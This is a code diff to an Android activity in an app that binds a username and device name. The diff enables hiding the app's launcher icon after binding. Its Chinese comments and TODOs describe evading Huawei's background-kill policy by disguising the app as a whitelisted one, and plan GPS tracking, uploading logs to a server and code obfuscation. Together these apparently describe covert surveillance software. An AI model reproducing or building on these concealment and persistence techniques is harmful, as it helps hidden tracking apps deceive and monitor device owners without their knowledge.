@@ -5,6 +5,7 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
@@ -46,11 +47,19 @@ import rx.schedulers.Schedulers;
 /**
  * Created by zou on 2018/5/3.
  */
+
+/**
+ * 华为手机会遇到的问题：
+ * 1.不在白名单会被系统杀死 （伪装白名单中的应用可以解决这个问题）
+ * 2.隐藏图标线程会中断 （线程中断后可以被重启，可不解决这个问题）
+ */
 //TODO 华为包和普通包的打包脚本不同
-//TODO 动态修改AndroidManifest的研究
-//TODO 项目日志传到服务器
+//TODO 自动跳转到自启动界面
 //TODO 添加GPS功能
+//TODO 项目日志传到服务器
 //TODO 线程优化 使用封装的线程池
+//TODO 代码混淆加固
+
 public class BindActivity extends Activity{
     private SharedPreferences sp;
     private EditText et_username,et_devicename;
@@ -136,11 +145,11 @@ public class BindActivity extends Activity{
     @Subscribe
     public void onEvent(Intent data){
         //有些手机使用这种方式隐藏图标会将service杀死
-//        // 将app图标隐藏：
-//        PackageManager p = getPackageManager();
-//        p.setComponentEnabledSetting(getComponentName(),
-//                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-//                PackageManager.DONT_KILL_APP);
+        // 将app图标隐藏：
+        PackageManager p = getPackageManager();
+        p.setComponentEnabledSetting(getComponentName(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 
     private void bindUser(){
